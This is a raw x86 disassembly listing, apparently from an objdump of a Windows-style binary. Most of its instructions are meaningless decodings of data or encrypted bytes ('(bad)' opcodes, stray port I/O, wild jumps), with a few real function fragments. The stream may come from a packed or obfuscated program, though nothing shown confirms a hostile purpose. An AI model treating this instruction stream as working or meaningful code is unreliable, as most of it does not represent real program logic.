  40b5fc:	adc    BYTE PTR [eax],0xbe
  40b5ff:	out    0x46,al
  40b601:	retf   0x6c59
  40b604:	adc    BYTE PTR [esp+ebx*4+0x2f972e8],cl
  40b60b:	fist   WORD PTR [edx+0xf91929a]
  40b611:	aad    0xa
  40b613:	xor    al,0x95
  40b615:	sub    eax,0xe226caa2
  40b61a:	mov    bh,dl
  40b61c:	js     0x40b624
  40b61e:	(bad)  
  40b61f:	scas   al,BYTE PTR es:[edi]
  40b620:	mov    edx,0x48378d06
  40b625:	adc    eax,0x8e14f099
  40b62a:	and    eax,0x3b96c2e1
  40b62f:	mov    bl,0x80
  40b631:	xchg   esp,eax
  40b632:	mov    esi,0xde464b6c
  40b637:	xchg   ebp,eax
  40b638:	sahf   
  40b639:	fstp   DWORD PTR [ebx-0x78b669a1]
  40b63f:	push   0xffffff85
  40b641:	scas   eax,DWORD PTR es:[edi]
  40b642:	mov    bh,dh
  40b644:	pusha  
  40b645:	inc    esi
  40b646:	xchg   esi,eax
  40b647:	jle    0x40b67b
  40b649:	stos   DWORD PTR es:[edi],eax
  40b64a:	and    BYTE PTR [eax],ah
  40b64c:	stos   BYTE PTR es:[edi],al
  40b64d:	inc    edi
  40b64e:	jl     0x40b5de
  40b650:	dec    eax
  40b651:	mov    esp,0xc5d902bd
  40b656:	adc    eax,0xfc0d528a
  40b65b:	test   eax,0xbc8d4b4
  40b660:	cmp    dl,BYTE PTR [esi+edi*2-0xf7ccbc0]
  40b667:	jp     0x40b5ff
  40b669:	cwde   
  40b66a:	xchg   ebx,eax
  40b66b:	xchg   ebp,eax
  40b66c:	jmp    0x30214d21
  40b671:	fcomp  DWORD PTR ds:0xbd9a0a2b
  40b677:	mov    dh,al
  40b679:	(bad)  
  40b67b:	sub    al,0x1b
  40b67d:	loope  0x40b664
  40b67f:	sbb    al,BYTE PTR ds:0x8b20cf14
  40b685:	inc    eax
  40b686:	or     al,0x8b
  40b688:	or     ecx,ebp
  40b68a:	mov    bl,0x1
  40b68c:	add    BYTE PTR [eax],al
  40b68e:	frndint 
  40b690:	std    
  40b691:	imul   ebx,DWORD PTR [ebp+0x69],0xffffffe9
  40b695:	mov    ch,BYTE PTR [edi+edx*8-0x20]
  40b699:	xor    ebx,DWORD PTR [eax]
  40b69b:	ja     0x40b639
  40b69d:	jb     0x40b6c9
  40b69f:	repz jo 0x40b712
  40b6a2:	xchg   ebp,eax
  40b6a3:	jg     0x40b715
  40b6a5:	jo     0x40b71d
  40b6a7:	push   0x90a535c3
  40b6ac:	rol    BYTE PTR [ebx],0x6e
  40b6af:	imul   edx,DWORD PTR [esi-0x8],0xffffffca
  40b6b3:	(bad)  
  40b6b4:	fwait
  40b6b5:	pop    ecx
  40b6b6:	cmp    eax,0x959431d8
  40b6bb:	mov    ebp,0x941863a
  40b6c0:	sbb    DWORD PTR [esi-0x52cb5f69],esp
  40b6c6:	sbb    BYTE PTR [eax+0x77],ch
  40b6c9:	pop    ds
  40b6ca:	xchg   edi,eax
  40b6cb:	test   edi,esp
  40b6cd:	xor    bh,BYTE PTR [eax-0x16bef6a2]
  40b6d3:	push   esi
  40b6d4:	out    dx,eax
  40b6d5:	lahf   
  40b6d6:	test   BYTE PTR [ecx-0x4b6059d1],bh
  40b6dc:	sub    al,0x78
  40b6de:	je     0x40b6db
  40b6e0:	pop    edx
  40b6e1:	test   DWORD PTR [edx],0x62ffe7bf
  40b6e7:	jge    0x40b6d8
  40b6e9:	cmc    
  40b6ea:	data16 cs test al,0x1b
  40b6ee:	or     ebp,ecx
  40b6f0:	jecxz  0x40b6f0
  40b6f2:	xchg   edi,eax
  40b6f3:	sbb    edx,0xf02eebb1
  40b6f9:	call   0x90ad4e4e
  40b6fe:	hlt    
  40b6ff:	dec    esp
  40b700:	push   0x3014f9a0
  40b705:	and    eax,0xa0a35479
  40b70a:	mov    al,0x89
  40b70c:	cmp    al,0xdd
  40b70e:	pop    edi
  40b70f:	mov    ebp,0x59b854c2
  40b714:	adc    DWORD PTR [ebx-0x5c],esi
  40b717:	adc    al,0x7d
  40b719:	enter  0xf0a9,0xa1
  40b71d:	(bad)
  40b721:	pop    ebp
  40b722:	shl    DWORD PTR [edx-0x2b5457f],1
  40b728:	jecxz  0x40b6ec
  40b72a:	jle    0x40b70e
  40b72c:	pushf  
  40b72d:	test   eax,0x3b9f273f
  40b732:	jo     0x40b797
  40b734:	stos   BYTE PTR es:[edi],al
  40b735:	inc    ebx
  40b736:	mov    bh,0xf4
  40b738:	test   DWORD PTR [edi+esi*8+0x6408da3e],esi
  40b73f:	into   
  40b740:	or     eax,0xd56a78d7
  40b745:	pop    eax
  40b746:	and    eax,0x3c
  40b749:	and    al,0x76
  40b74b:	dec    esp
  40b74c:	inc    edi
  40b74d:	lds    eax,FWORD PTR [ebx+0x6d914ca8]
  40b753:	and    DWORD PTR [edi+0x4c],esp
  40b756:	jnp    0x40b765
  40b758:	shr    DWORD PTR [eax],cl
  40b75a:	mov    al,0x9d
  40b75c:	pop    ss
  40b75d:	mov    ah,0x35
  40b75f:	shl    BYTE PTR [eax+ebx*1+0xe],0x53
  40b764:	or     cl,BYTE PTR [ebx+eiz*8-0x58223f70]
  40b76b:	push   ds
  40b76c:	shl    BYTE PTR [ecx],1
  40b76e:	or     dh,BYTE PTR [edi]
  40b770:	and    edi,edi
  40b772:	cmp    bh,BYTE PTR [eax-0x2df03c47]
  40b778:	push   edx
  40b779:	jp     0x40b70f
  40b77b:	je     0x40b720
  40b77d:	imul   ebx,DWORD PTR [ecx],0xda06012d
  40b783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b784:	xchg   edi,eax
  40b785:	pop    ebx
  40b786:	std    
  40b787:	mov    DWORD PTR [esi],ecx
  40b789:	add    al,0x5e
  40b78b:	dec    edx
  40b78c:	mov    ah,0x2e
  40b78e:	fnstenv [esp+esi*8-0x35b2a05d]
  40b795:	and    al,0xfb
  40b797:	fnstcw WORD PTR ds:0x21f5b36d
  40b79d:	jl     0x40b76a
  40b79f:	(bad)  
  40b7a0:	fisttp WORD PTR [ebp+0x18c7eeef]
  40b7a6:	cs cli 
  40b7a8:	xchg   esp,eax
  40b7a9:	ret    
  40b7aa:	mov    al,0x3f
  40b7ac:	dec    eax
  40b7ad:	call   0xb6868833
  40b7b2:	or     BYTE PTR [ebx+ebp*4],al
  40b7b5:	cmc    
  40b7b6:	pop    DWORD PTR [edx+0x231705ce]
  40b7bc:	mov    ch,0xdd
  40b7be:	bound  esp,QWORD PTR [esi+0x2c]
  40b7c1:	xchg   edi,eax
  40b7c2:	out    0x4f,al
  40b7c4:	inc    ebx
  40b7c5:	jle    0x40b7b5
  40b7c7:	push   edx
  40b7c8:	lock inc ebp
  40b7ca:	out    dx,eax
  40b7cb:	je     0x40b847
  40b7cd:	test   BYTE PTR [eax+0x5f],ch
  40b7d0:	fdiv   QWORD PTR [ebx]
  40b7d2:	and    dh,BYTE PTR [ebx]
  40b7d4:	xchg   DWORD PTR [edx+0x40],esp
  40b7d7:	cmp    ebx,0x5957b5bf
  40b7dd:	in     al,0xf8
  40b7df:	mov    ds:0x85194fd6,al
  40b7e4:	daa    
  40b7e5:	ffree  st(4)
  40b7e7:	(bad)
  40b7ec:	inc    esi
  40b7ed:	pusha  
  40b7ee:	es mov dh,0x1
  40b7f1:	jno    0x40b7fc
  40b7f3:	cmp    DWORD PTR [esi+0xa9f38f7],edx
  40b7f9:	cdq    
  40b7fa:	aaa    
  40b7fb:	(bad)  
  40b7fc:	mul    esp
  40b7fe:	jb     0x40b7da
  40b800:	and    BYTE PTR [eax-0x63],0xfa
  40b804:	dec    ebx
  40b805:	jg     0x40b85a
  40b807:	xchg   al,ah
  40b809:	jp     0x40b7f3
  40b80b:	jbe    0x40b802
  40b80d:	out    dx,al
  40b80e:	stos   BYTE PTR es:[edi],al
  40b80f:	mov    WORD PTR [eax],ss
  40b811:	lods   eax,DWORD PTR ds:[esi]
  40b812:	jae    0x40b7cd
  40b814:	lods   al,BYTE PTR ds:[esi]
  40b815:	pop    eax
  40b816:	(bad)  
  40b817:	mov    edi,0xd633c71c
  40b81c:	jns    0x40b7c1
  40b81e:	pop    edi
  40b81f:	xor    DWORD PTR [ecx+0x65464e9c],0x0
  40b826:	push   ds
  40b827:	dec    edx
  40b828:	mov    ebp,0x4821e486
  40b82d:	and    al,0x52
  40b82f:	cmp    eax,esp
  40b831:	retf   
  40b832:	and    dh,dl
  40b834:	pop    ebp
  40b835:	scas   al,BYTE PTR es:[edi]
  40b836:	inc    ebp
  40b837:	push   eax
  40b838:	xor    BYTE PTR [edx-0x7b],cl
  40b83b:	fucom  st(2)
  40b83d:	or     DWORD PTR [eax+0x48ac34e],esi
  40b843:	or     BYTE PTR [edi+esi*1],al
  40b846:	jmp    0x40b9fe
  40b84b:	hlt    
  40b84c:	sbb    eax,0x71518348
  40b851:	rep ins DWORD PTR es:[edi],dx
  40b853:	cmp    BYTE PTR [esp+ecx*2],al
  40b856:	aaa    
  40b857:	not    BYTE PTR [eax-0xdb02b5a]
  40b85d:	jo     0x40b8cf
  40b85f:	xchg   ebp,eax
  40b860:	jg     0x40b8d2
  40b862:	jo     0x40b8a4
  40b864:	jle    0x40b8d1
  40b866:	lods   al,BYTE PTR ds:[esi]
  40b867:	inc    edx
  40b868:	cld    
  40b869:	in     eax,0x7
  40b86b:	stc    
  40b86c:	push   ss
  40b86d:	nop
  40b86e:	lds    esp,FWORD PTR [ecx-0x5b2297c5]
  40b874:	adc    eax,esp
  40b876:	fwait
  40b877:	sar    DWORD PTR [ebx-0x7d7796cd],0x55
  40b87e:	pop    edx
  40b87f:	retf   
  40b880:	cmp    ecx,ecx
  40b882:	popa   
  40b883:	push   esi
  40b884:	jno    0x40b8b0
  40b886:	jne    0x40b864
  40b888:	popf   
  40b889:	push   esi
  40b88a:	dec    ebp
  40b88b:	in     eax,0x56
  40b88d:	cli    
  40b88e:	imul   eax,DWORD PTR [edi-0x1a],0xe3af39f7
  40b895:	ret    0xe722
  40b898:	pop    eax
  40b899:	jecxz  0x40b909
  40b89b:	pop    edi
  40b89c:	jmp    0x37455ef7
  40b8a1:	xchg   esi,eax
  40b8a2:	and    eax,0x8c47d6e4
  40b8a7:	aam    0xa0
  40b8a9:	sahf   
  40b8aa:	lds    ebp,FWORD PTR [esi+eiz*4]
  40b8ad:	mov    ecx,ecx
  40b8af:	mov    dl,0xf5
  40b8b1:	in     al,0x8e
  40b8b3:	shl    DWORD PTR [edx+0x506083c0],1
  40b8b9:	dec    edi
  40b8ba:	sbb    DWORD PTR [esi-0x6],eax
  40b8bd:	ret    0x66e
  40b8c0:	mov    edx,DWORD PTR [ecx-0x70]
  40b8c3:	mov    ecx,0xfc09297d
  40b8c8:	push   0xb
  40b8ca:	mov    ebp,0x7811b71d
  40b8cf:	and    ch,bh
  40b8d1:	daa    
  40b8d2:	popa   
  40b8d3:	test   eax,0x4d3f8827
  40b8d8:	pop    esp
  40b8d9:	daa    
  40b8da:	out    0x2f,al
  40b8dc:	push   ds
  40b8dd:	jmp    0x2e0b2e6e
  40b8e2:	cdq    
  40b8e3:	scas   eax,DWORD PTR es:[edi]
  40b8e4:	and    eax,0xc12ba86d
  40b8e9:	and    DWORD PTR [eax-0x6044ac53],ecx
  40b8ef:	sahf   
  40b8f0:	mov    ebx,0x51904b52
  40b8f5:	scas   al,BYTE PTR es:[edi]
  40b8f6:	jbe    0x40b938
  40b8f8:	dec    eax
  40b8f9:	dec    eax
  40b8fa:	push   edx
  40b8fb:	out    dx,al
  40b8fc:	jae    0x40b904
  40b8fe:	xchg   ecx,eax
  40b8ff:	jns    0x40b975
  40b901:	xor    eax,0x88130607
  40b906:	addr16 jnp 0x40b980
  40b909:	cmp    ah,BYTE PTR [eax+0x317f408]
  40b90f:	adc    al,0x84
  40b911:	mov    ch,0x14
  40b913:	stos   DWORD PTR es:[edi],eax
  40b914:	mov    BYTE PTR [edi+0x205d973],al
  40b91a:	bound  esi,QWORD PTR [ecx-0x48]
  40b91d:	fbld   TBYTE PTR [ebx-0x3b]
  40b920:	jb     0x40b95a
  40b922:	cmp    al,0x45
  40b924:	into   
  40b925:	data16 jb 0x40b98c
  40b928:	dec    ebp
  40b929:	mov    bl,BYTE PTR [ebx-0x24]
  40b92c:	js     0x40b8f8
  40b92e:	dec    eax
  40b92f:	xchg   ebp,eax
  40b930:	push   ecx
  40b931:	jmp    0xa589:0x6a3d5121
  40b938:	cmp    BYTE PTR [edx-0xa],bl
  40b93b:	or     ch,BYTE PTR gs:[ecx]
  40b93e:	das    
  40b93f:	cmc    
  40b940:	imul   ecx,DWORD PTR [ecx-0x48b7d3e7],0x29
  40b947:	outs   dx,BYTE PTR ds:[esi]
  40b948:	add    DWORD PTR [ecx+0x2fdb2254],ebp
  40b94e:	xchg   ebp,eax
  40b94f:	inc    ebx
  40b950:	cmp    cl,ah
  40b952:	dec    edi
  40b953:	out    0xf5,eax
  40b955:	push   ebp
  40b956:	cmp    cl,BYTE PTR [edx+0x28]
  40b959:	pop    es
  40b95a:	sbb    al,0xd5
  40b95c:	enter  0xed61,0x31
  40b960:	push   ebx
  40b961:	fld    DWORD PTR [esi-0x3d53be7d]
  40b967:	int3   
  40b968:	fstp   QWORD PTR [eax+0x9]
  40b96b:	test   al,0x52
  40b96d:	inc    esp
  40b96e:	dec    esi
  40b96f:	sub    ah,al
  40b971:	mov    ecx,0xe04d3702
  40b976:	push   edx
  40b977:	push   esi
  40b978:	gs test al,0xca
  40b97b:	xor    ebx,esp
  40b97d:	add    ch,BYTE PTR [ebx-0x65e18ebf]
  40b983:	(bad)  
  40b984:	bswap  esi
  40b986:	cmp    DWORD PTR [eax+0x4e153a8e],esi
  40b98c:	dec    esp
  40b98d:	stos   BYTE PTR es:[edi],al
  40b98e:	jne    0x40b9d3
  40b990:	pop    ds
  40b991:	jle    0x40b977
  40b993:	cmc    
  40b994:	mov    ah,0x9f
  40b996:	bound  ebp,QWORD PTR [ebp-0x6a5e0355]
  40b99c:	jb     0x40b9b9
  40b99e:	popa   
  40b99f:	push   ebp
  40b9a0:	mov    BYTE PTR ds:[di-0x58d0],al
  40b9a6:	push   edx
  40b9a7:	push   edx
  40b9a8:	mov    esi,0xeec8d0d4
  40b9ad:	jbe    0x40b9a8
  40b9af:	dec    edx
  40b9b0:	out    0x4b,al
  40b9b2:	(bad)  
  40b9b3:	popf   
  40b9b4:	pusha  
  40b9b5:	xor    al,0x85
  40b9b7:	imul   ecx,DWORD PTR [ebx-0x2b],0xa63cc9a
  40b9be:	les    ecx,FWORD PTR [ebx-0x54]
  40b9c1:	fwait
  40b9c2:	popa   
  40b9c3:	dec    ebp
  40b9c4:	ss ja  0x40b9ee
  40b9c7:	jbe    0x40b9f0
  40b9c9:	pop    ecx
  40b9ca:	mov    ebx,fs
  40b9cc:	or     edx,edx
  40b9ce:	sbb    al,0x80
  40b9d0:	xlat   BYTE PTR ds:[ebx]
  40b9d1:	sub    ecx,DWORD PTR [edx]
  40b9d3:	out    0x78,eax
  40b9d5:	jmp    0x40ba15
  40b9d7:	leave  
  40b9d8:	inc    esp
  40b9d9:	sahf   
  40b9da:	inc    esi
  40b9db:	jmp    0x4d991ed2
  40b9e0:	int    0xb3
  40b9e2:	push   eax
  40b9e3:	popf   
  40b9e4:	aam    0x8f
  40b9e6:	scas   al,BYTE PTR es:[edi]
  40b9e7:	ficom  DWORD PTR [edi+0x73]
  40b9ea:	iret   
  40b9eb:	and    DWORD PTR [edi],esp
  40b9ed:	jp     0x40ba50
  40b9ef:	pusha  
  40b9f0:	leave  
  40b9f1:	je     0x40b9e7
  40b9f3:	or     bl,bh
  40b9f5:	push   ecx
  40b9f6:	and    BYTE PTR [ecx],bh
  40b9f8:	lods   al,BYTE PTR ds:[esi]
  40b9f9:	loop   0x40b9c8
  40b9fb:	fdivrp st(3),st
  40b9fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9fe:	xor    al,0x47
  40ba00:	cmp    al,0xc5
  40ba02:	je     0x40ba19
  40ba08:	mov    eax,DWORD PTR [ebp+0x8]
  40ba0b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba0e:	xor    eax,esi
  40ba10:	add    eax,edi
  40ba12:	mov    DWORD PTR [ecx],eax
  40ba14:	jmp    0x40bbf5
  40ba19:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40ba20:	jmp    0x40bbf5
  40ba25:	mov    eax,DWORD PTR [ebp-0x8]
  40ba28:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ba2b:	mov    ecx,DWORD PTR [ecx]
  40ba2d:	mov    DWORD PTR [eax],ecx
  40ba2f:	mov    eax,DWORD PTR [ebp+0xc]
  40ba32:	jmp    0x40bbea
  40ba37:	retf   
  40ba38:	(bad)  [ebx+0x5171a9c1]
  40ba3e:	icebp  
  40ba3f:	dec    eax
  40ba40:	cmp    eax,0x15650d6b
  40ba45:	jge    0x40ba42
  40ba47:	in     al,0xf0
  40ba49:	jo     0x40babb
  40ba4b:	xchg   ebp,eax
  40ba4c:	jg     0x40babe
  40ba4e:	jo     0x40ba12
  40ba50:	fwait
  40ba51:	aaa    
  40ba52:	push   0xdaaa6bb0
  40ba57:	mov    bl,0x3b
  40ba59:	in     eax,0x92
  40ba5b:	pop    ss
  40ba5c:	cli    
  40ba5d:	pop    es
  40ba5e:	cmp    al,0xd4
  40ba60:	fs mov ch,0x29
  40ba63:	div    DWORD PTR [edi]
  40ba65:	inc    eax
  40ba66:	fs stos BYTE PTR es:[edi],al
  40ba68:	scas   al,BYTE PTR es:[edi]
  40ba69:	test   eax,0x8078ef3c
  40ba6e:	mov    edx,DWORD PTR [ebx-0x386ff864]
  40ba74:	sub    al,0x68
  40ba76:	inc    esi
  40ba77:	aaa    
  40ba78:	push   edi
  40ba79:	cmc    
  40ba7a:	jmp    0x731499ac
  40ba7f:	es jecxz 0x40ba6e
  40ba82:	cld    
  40ba83:	test   al,0xb6
  40ba85:	jo     0x40ba5e
  40ba87:	mov    ds:0x78487272,al
  40ba8c:	fs sub al,0x7
  40ba8f:	test   al,0x9a
  40ba91:	xlat   BYTE PTR ds:[ebx]
  40ba92:	pop    ecx
  40ba93:	(bad)  
  40ba94:	out    0xc9,eax
  40ba96:	aam    0xd6
  40ba98:	lods   al,BYTE PTR ds:[esi]
  40ba99:	pop    eax
  40ba9a:	inc    ebp
  40ba9b:	add    esi,0xffffffd7
  40ba9e:	cdq    
  40ba9f:	out    dx,al
  40baa0:	fistp  DWORD PTR [ebx+eiz*4+0x26fadb0b]
  40baa7:	push   ds
  40baa8:	fdivrp st(5),st
  40baaa:	inc    esp
  40baab:	adc    DWORD PTR [edx],edi
  40baad:	or     al,0xe7
  40baaf:	inc    ebx
  40bab0:	inc    esi
  40bab1:	jp     0x40baff
  40bab3:	xor    al,0xf0
  40bab5:	mov    ah,0x1e
  40bab7:	sbb    ah,BYTE PTR [esp+edi*1]
  40baba:	out    dx,eax
  40babb:	je     0x40ba9a
  40babd:	les    ebx,FWORD PTR ds:0x8cd35971
  40bac3:	push   edi
  40bac4:	scas   al,BYTE PTR es:[edi]
  40bac5:	leave  
  40bac6:	out    0xcb,al
  40bac8:	cmc    
  40bac9:	inc    ecx
  40baca:	fwait
  40bacb:	ja     0x40ba98
  40bacd:	ins    BYTE PTR es:[edi],dx
  40bace:	stc    
  40bacf:	stos   DWORD PTR es:[edi],eax
  40bad0:	cmp    DWORD PTR [edx+0x5e],esp
  40bad3:	pop    ecx
  40bad4:	sti    
  40bad5:	out    dx,al
  40bad6:	inc    ebp
  40bad7:	push   ss
  40bad8:	pop    es
  40bad9:	into   
  40bada:	call   0x51586b56
  40badf:	(bad)  
  40bae0:	loopne 0x40bb4d
  40bae2:	in     eax,dx
  40bae3:	loope  0x40bb16
  40bae5:	pop    eax
  40bae6:	pushf  
  40bae7:	sahf   
  40bae8:	bound  esp,QWORD PTR [ebx-0x15a8e7be]
  40baee:	adc    eax,0x197fd4eb
  40baf3:	pushw  0x647a
  40baf7:	cmp    eax,0x8d9ea83d
  40bafc:	mov    BYTE PTR [esi+0x6cdeb59b],bl
  40bb02:	les    ebx,FWORD PTR [edx]
  40bb04:	push   ebx
  40bb05:	push   edi
  40bb06:	push   cs
  40bb07:	inc    eax
  40bb08:	js     0x40baac
  40bb0a:	sbb    al,0x64
  40bb0c:	outs   dx,BYTE PTR ds:[esi]
  40bb0d:	lds    esi,FWORD PTR [edx]
  40bb0f:	enter  0x6b81,0xc5
  40bb13:	leave  
  40bb14:	mov    dh,0x6f
  40bb16:	and    BYTE PTR gs:[esi-0x6cd260],dl
  40bb1d:	mov    bl,cl
  40bb1f:	jbe    0x40babd
  40bb21:	mov    ds:0x526ecc39,eax
  40bb26:	ret    
  40bb27:	push   edi
  40bb28:	xor    ebp,DWORD PTR [edi-0x13]
  40bb2b:	mov    DWORD PTR [eax],esp
  40bb2d:	cmp    BYTE PTR [ebx],0x6d
  40bb30:	pusha  
  40bb31:	mov    eax,ds:0xc9595ca6
  40bb36:	mov    ds:0xb3d6596f,al
  40bb3b:	std    
  40bb3c:	cld    
  40bb3d:	sbb    DWORD PTR es:[ebx-0x7ffe5324],ebp
  40bb44:	or     bl,dl
  40bb46:	mov    ecx,0xf7f95d99
  40bb4b:	add    BYTE PTR [edi],cl
  40bb4d:	jg     0x40bb10
  40bb4f:	add    DWORD PTR [edi-0x2d1ff9fd],0xffffffa7
  40bb56:	addr16 and eax,0x908b4654
  40bb5c:	xor    eax,0xcf3e00a0
  40bb61:	mov    ?,WORD PTR [ecx]
  40bb63:	mov    eax,0xa29112ac
  40bb68:	sub    BYTE PTR [ecx],cl
  40bb6a:	jne    0x40bb2d
  40bb6c:	xlat   BYTE PTR ds:[ebx]
  40bb6d:	mov    edi,0xa5e4f2ca
  40bb72:	mov    edx,0x4a7a79e1
  40bb77:	aam    0x54
  40bb79:	jl     0x40bb90
  40bb7b:	xchg   DWORD PTR [esi],ebx
  40bb7d:	inc    eax
  40bb7e:	mov    esi,0x7d066e88
  40bb83:	adc    eax,0xffffff83
  40bb86:	lock inc eax
  40bb88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb89:	out    dx,eax
  40bb8a:	push   0x802d689d
  40bb8f:	fstp   TBYTE PTR [edi+0x15]
  40bb92:	jo     0x40bb79
  40bb94:	or     eax,0x22eebbb3
  40bb99:	jle    0x40bb9f
  40bb9b:	cmp    DWORD PTR [ebp-0x7bd9f32a],0x6a
  40bba2:	mov    esi,0x2e59f878
  40bba7:	sar    DWORD PTR [ecx+0x1c],cl
  40bbaa:	inc    esp
  40bbab:	push   ds
  40bbac:	sub    esi,DWORD PTR [ecx+ebp*4+0x41935f0e]
  40bbb3:	cmc    
  40bbb4:	addr16 (bad) 
  40bbb6:	stos   DWORD PTR es:[edi],eax
  40bbb7:	(bad)  
  40bbb8:	out    dx,al
  40bbb9:	arpl   WORD PTR [edx],ax
  40bbbb:	inc    esp
  40bbbc:	iret   
  40bbbd:	out    dx,al
  40bbbe:	mov    cl,0x9
  40bbc0:	xchg   esp,eax
  40bbc1:	outs   dx,DWORD PTR cs:[esi]
  40bbc3:	fxch   st(2)
  40bbc5:	stos   DWORD PTR es:[edi],eax
  40bbc6:	add    ecx,edx
  40bbc8:	jge    0x40bbbd
  40bbca:	pop    es
  40bbcb:	mov    al,ds:0xc8b9bfb7
  40bbd0:	popa   
  40bbd1:	xor    al,0x22
  40bbd3:	(bad)  
  40bbd4:	rcl    BYTE PTR [edx-0x18],1
  40bbd7:	mov    ch,0x4a
  40bbd9:	fidivr DWORD PTR [ebp+0x43]
  40bbdc:	in     al,dx
  40bbdd:	(bad)  
  40bbdf:	adc    BYTE PTR [edx-0x18e34b6],ch
  40bbe5:	xchg   DWORD PTR [edx-0xe],eax
  40bbe8:	out    0xed,al
  40bbea:	mov    eax,DWORD PTR [ebp+0x8]
  40bbed:	push   DWORD PTR [ebp-0x8]
  40bbf0:	call   0x401000
  40bbf5:	mov    eax,DWORD PTR [ebp-0xc]
  40bbf8:	cmp    eax,ebx
  40bbfa:	je     0x40acdc
  40bc00:	mov    eax,DWORD PTR [ebp-0x8]
  40bc03:	mov    eax,DWORD PTR [eax]
  40bc05:	pop    edi
  40bc06:	pop    esi
  40bc07:	pop    ebx
  40bc08:	leave  
  40bc09:	ret    0x8
  40bc0c:	push   ebp
  40bc0d:	mov    ebp,esp
  40bc0f:	push   ecx
  40bc10:	sbb    DWORD PTR ds:0x43439a,ecx
  40bc16:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40bc1d:	sbb    eax,DWORD PTR ds:0x434392
  40bc23:	mov    eax,DWORD PTR [ebp+0x8]
  40bc26:	or     DWORD PTR ds:0x434415,0x432dbe
  40bc30:	jmp    0x40be4b
  40bc35:	push   es
  40bc36:	mov    ch,dl
  40bc38:	xor    al,0x72
  40bc3a:	je     0x40bc02
  40bc3c:	stos   BYTE PTR es:[edi],al
  40bc3d:	aas    
  40bc3e:	lods   al,BYTE PTR ds:[esi]
  40bc3f:	and    DWORD PTR [eax-0x7e7e315],edi
  40bc45:	jns    0x40bc45
  40bc47:	jo     0x40bcb9
  40bc49:	jb     0x40bcca
  40bc4b:	jo     0x40bcbd
  40bc4d:	punpckhbw mm2,QWORD PTR es:[edi+0x79]
  40bc52:	daa    
  40bc53:	push   ecx
  40bc54:	mov    ah,dh
  40bc56:	jp     0x40bc93
  40bc58:	push   ecx
  40bc59:	mov    DWORD PTR [ebp-0x75],edx
  40bc5c:	stos   BYTE PTR es:[edi],al
  40bc5d:	fsub   st,st(0)
  40bc5f:	loope  0x40bc16
  40bc61:	pop    edx
  40bc62:	push   esp
  40bc63:	cld    
  40bc64:	mov    dl,0x3e
  40bc66:	pop    ebx
  40bc67:	pop    edx
  40bc68:	xchg   edi,eax
  40bc69:	inc    esp
  40bc6a:	xor    BYTE PTR [ebp-0x18],ah
  40bc6d:	mov    dl,0x72
  40bc6f:	pop    es
  40bc70:	aam    0xc1
  40bc72:	imul   edx,eax,0xc595093b
  40bc78:	outs   dx,DWORD PTR ds:[esi]
  40bc79:	mov    ds:0x66b292a9,al
  40bc7e:	sub    dh,BYTE PTR [ecx+ebp*4+0x15dd7320]
  40bc85:	cli    
  40bc86:	pop    esp
  40bc87:	dec    eax
  40bc88:	xchg   esp,eax
  40bc89:	jne    0x40bc5c
  40bc8b:	dec    esp
  40bc8c:	pop    ecx
  40bc8d:	cmp    ecx,DWORD PTR [ecx+0x27]
  40bc90:	mov    dh,0x50
  40bc92:	nop
  40bc93:	inc    esi
  40bc94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc95:	in     eax,0x1e
  40bc97:	fcomp  DWORD PTR [esi-0x5a]
  40bc9a:	pop    esi
  40bc9b:	sahf   
  40bc9c:	jbe    0x40bc91
  40bc9e:	sbb    dh,BYTE PTR [ecx]
  40bca0:	mov    edi,0x739b5f98
  40bca5:	mov    bh,BYTE PTR [edi+0x4b]
  40bca8:	int3   
  40bca9:	mov    esi,0xf7936a06
  40bcae:	popa   
  40bcaf:	add    ah,dl
  40bcb1:	add    BYTE PTR [eax-0x1e],ah
  40bcb4:	(bad)  
  40bcb5:	jmp    0x40bcbf
  40bcb7:	fs inc ebx
  40bcb9:	mov    DWORD PTR [eax+esi*4+0x5896087e],ebx
  40bcc0:	pop    bx
  40bcc2:	pushf  
  40bcc3:	gs inc eax
  40bcc5:	je     0x40bc76
  40bcc7:	idiv   esp
  40bcc9:	mov    dl,0x64
  40bccb:	mov    esi,DWORD PTR [ecx-0x1a]
  40bcce:	xchg   edx,eax
  40bccf:	xor    DWORD PTR [esi-0x5a498f8c],esi
  40bcd5:	dec    ebp
  40bcd6:	jge    0x40bcc1
  40bcd8:	push   ebp
  40bcd9:	dec    ebp
  40bcda:	jmp    0x40bc92
  40bcdc:	hlt    
  40bcdd:	fistp  QWORD PTR [edx+0x54435d4c]
  40bce3:	xor    al,0xf6
  40bce5:	lds    esi,FWORD PTR [esi+0x474c16d3]
  40bceb:	into   
  40bcec:	(bad)  
  40bced:	lods   eax,DWORD PTR ds:[esi]
  40bcee:	out    0x1e,al
  40bcf0:	jmp    0x7f40:0x573518b9
  40bcf7:	adc    BYTE PTR ss:[ebp-0x9],cl
  40bcfb:	dec    BYTE PTR [edi+0x1]
  40bcfe:	stos   DWORD PTR es:[edi],eax
  40bcff:	push   ebp
  40bd00:	enter  0xb3c4,0xcb
  40bd04:	jl     0x40bcef
  40bd06:	xor    cl,BYTE PTR [esi+0x71]
  40bd09:	add    DWORD PTR [edi],0xb3b71db0
  40bd0f:	imul   ebp,DWORD PTR [ebx+0xdbde79e],0x28309da1
  40bd19:	inc    edi
  40bd1a:	aas    
  40bd1b:	scas   al,BYTE PTR es:[edi]
  40bd1c:	xor    al,0x0
  40bd1e:	push   ecx
  40bd1f:	lods   al,BYTE PTR ds:[esi]
  40bd20:	mov    ?,WORD PTR [ebp+0x1f]
  40bd23:	and    al,0x47
  40bd25:	jg     0x40bd56
  40bd27:	sbb    al,0xa8
  40bd29:	mov    esp,DWORD PTR [ecx]
  40bd2b:	adc    eax,0xb1f4ae60
  40bd30:	add    ah,BYTE PTR [ebx+0x33c93a06]
  40bd36:	(bad)  
  40bd37:	mov    ch,0x28
  40bd39:	int    0x52
  40bd3b:	adc    eax,DWORD PTR [edx]
  40bd3d:	sahf   
  40bd3e:	call   edx
  40bd40:	bound  ecx,QWORD PTR [eax]
  40bd42:	cmp    DWORD PTR [esi-0x3cbf1c83],0xffffffc6
  40bd49:	inc    edx
  40bd4a:	rol    BYTE PTR [edx],0x6a
  40bd4d:	jecxz  0x40bd0c
